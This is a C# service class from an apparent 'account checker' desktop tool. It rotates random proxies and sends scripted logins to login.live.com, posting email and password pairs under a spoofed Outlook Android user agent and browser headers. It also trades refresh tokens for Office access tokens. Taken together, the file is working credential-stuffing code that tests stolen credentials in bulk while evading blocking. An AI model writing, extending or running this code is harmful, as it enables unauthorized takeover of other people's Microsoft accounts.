using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using AccountCheckerWPF.Managers;
using AccountCheckerWPF.Models;
using AccountCheckerWPF.Services.Interface;

namespace AccountCheckerWPF.Services;

public class HttpServices : IHttpServices
{
    private HttpClient _httpClient;
    private Proxy _proxy;
    private readonly ProxyManager _proxyManager;

    public HttpServices(ProxyManager proxyManager)
    {
        _proxyManager = proxyManager;
    }

    public void InitHttpClient()
    {
        try
        {
            var httpClientHandler = _proxyManager.GetRandomProxyTransport(out _proxy);

            _httpClient = new HttpClient(httpClientHandler)
            {
                Timeout = TimeSpan.FromSeconds(10)
            };
        }
        catch (Exception e)
        {
            _proxy.InUse = false;

            throw;
        }
    }

    public async Task<HttpResponseMessage> SendGetParamsFromLoginPageRequestAsync()
    {
        try
        {
            var getRequest = new HttpRequestMessage(HttpMethod.Get, "https://login.live.com/");
            getRequest.Headers.Add("User-Agent",
                "Mozilla/5.0 (Linux; Android 9; SM-G9880 Build/PQ3A.190705.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Safari/537.36");
            getRequest.Headers.Add("Accept", "*/*");
            getRequest.Headers.Add("Accept-Language", "en-US,en;q=0.8");

            return await _httpClient.SendAsync(getRequest);
        }
        catch (Exception e)
        {
            _proxy.InUse = false;
            throw;
        }
    }

    public async Task<HttpResponseMessage> SendPostLoginRequestAsync(string email, string password, string ppft,
        string contextid, string bk, string uaid)
    {
        try
        {
            var contentPost =
                $"i13=1&login={WebUtility.UrlEncode(email)}&loginfmt={WebUtility.UrlEncode(email)}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={WebUtility.UrlEncode(password)}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=Passp&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&i19=41679";
            var contentBytes = new StringContent(contentPost, Encoding.UTF8, "application/x-www-form-urlencoded");

            var postRequest = new HttpRequestMessage(HttpMethod.Post,
                $"https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={WebUtility.UrlEncode(email)}&contextid={contextid}&bk={bk}&uaid={uaid}&pid=15216")
            {
                Content = contentBytes
            };

            postRequest.Headers.Host = "login.live.com";
            postRequest.Headers.Connection.ParseAdd("keep-alive");
            postRequest.Headers.CacheControl = new CacheControlHeaderValue
            {
                MaxAge = TimeSpan.Zero
            };
            postRequest.Headers.Add("Origin", "https://login.live.com");
            postRequest.Headers.Add("User-Agent",
                "Mozilla/5.0 (Linux; Android 9; SM-G9880 Build/PQ3A.190705.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Safari/537.36");
            postRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
            postRequest.Headers.Referrer = new Uri("https://login.live.com");
            postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("text/html"));
            postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("application/xhtml+xml"));
            postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("application/xml", 0.9));
            postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("image/avif", 0.8));
            postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("image/webp", 0.8));
            postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("image/apng", 0.8));
            postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("*/*", 0.8));
            postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("application/signed-exchange", 0.9));
            postRequest.Headers.Add("X-Requested-With", "com.microsoft.office.outlook");
            postRequest.Headers.Add("Sec-Fetch-Site", "same-origin");
            postRequest.Headers.Add("Sec-Fetch-Mode", "navigate");
            postRequest.Headers.Add("Sec-Fetch-User", "?1");
            postRequest.Headers.Add("Sec-Fetch-Dest", "document");
            postRequest.Headers.AcceptEncoding.ParseAdd("gzip");
            postRequest.Headers.AcceptEncoding.ParseAdd("deflate");
            postRequest.Headers.AcceptLanguage.Add(new StringWithQualityHeaderValue("en-US"));
            postRequest.Headers.AcceptLanguage.Add(new StringWithQualityHeaderValue("en", 0.9));

            return await _httpClient.SendAsync(postRequest);
        }
        catch (Exception e)
        {
            _proxy.InUse = false;
            throw;
        }
    }


    public async Task<HttpResponseMessage> SendPostRequestToGetAccessTokenAsync(string refreshToken)
    {
        try
        {
            var requestMessage = new HttpRequestMessage(HttpMethod.Post, "https://login.live.com/oauth20_token.srf");
            requestMessage.Headers.TryAddWithoutValidation("x-ms-sso-Ignore-SSO", "1");
            requestMessage.Headers.TryAddWithoutValidation("User-Agent", "Outlook-Android/2.0");
            requestMessage.Headers.TryAddWithoutValidation("Content-Type", "application/x-www-form-urlencoded");
            requestMessage.Headers.TryAddWithoutValidation("Host", "login.live.com");
            requestMessage.Headers.TryAddWithoutValidation("Connection", "Keep-Alive");
            requestMessage.Headers.TryAddWithoutValidation("Accept-Encoding", "gzip");

            var content = new StringContent(
                $"grant_type=refresh_token&client_id=0000000048170EF2&scope=https%3A%2F%2Fsubstrate.office.com%2FUser-Internal.ReadWrite&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&refresh_token={refreshToken}&uaid=db28da170f2a4b85a26388d0a6cdbb6e",
                Encoding.UTF8,
                "application/x-www-form-urlencoded");

            requestMessage.Content = content;

            return await _httpClient.SendAsync(requestMessage);
        }
        catch (Exception e)
        {
            _proxy.InUse = false;
            throw;
        }
    }
}